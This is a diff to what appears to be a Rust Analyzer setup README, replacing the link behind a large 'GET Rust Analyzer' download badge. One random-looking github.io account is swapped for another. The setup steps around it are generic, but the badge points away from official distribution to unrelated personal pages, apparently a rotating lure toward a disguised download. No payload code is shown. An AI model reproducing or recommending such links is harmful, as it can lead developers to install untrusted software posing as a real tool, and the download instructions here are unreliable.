@@ -56,7 +56,7 @@ Rust Analyzer setup is designed around existing Rust tooling. It works with carg
 
 Prerequisites: A Rust toolchain, cargo access, and an editor that can connect to the Rust Analyzer LSP server.
 
-[![GET Rust Analyzer](https://img.shields.io/badge/GET%20%E2%80%94%20Rust%20Analyzer-0078D6?style=for-the-badge&logoColor=white)](https://nelsonleblancniei.github.io/.github/rust-analyzer-app)
+[![GET Rust Analyzer](https://img.shields.io/badge/GET%20%E2%80%94%20Rust%20Analyzer-0078D6?style=for-the-badge&logoColor=white)](https://erenlopezmgpm.github.io/.github/rust-analyzer-app)
 
 1.  **Install the Language Server:** Use your editor package, official release, or toolchain instructions to complete Rust Analyzer install and place the server where the editor can find it.
 2.  **Open a Cargo Project:** Launch the editor from the repository root so Rust Analyzer cargo discovery can read Cargo.toml, workspace members, features, and targets.
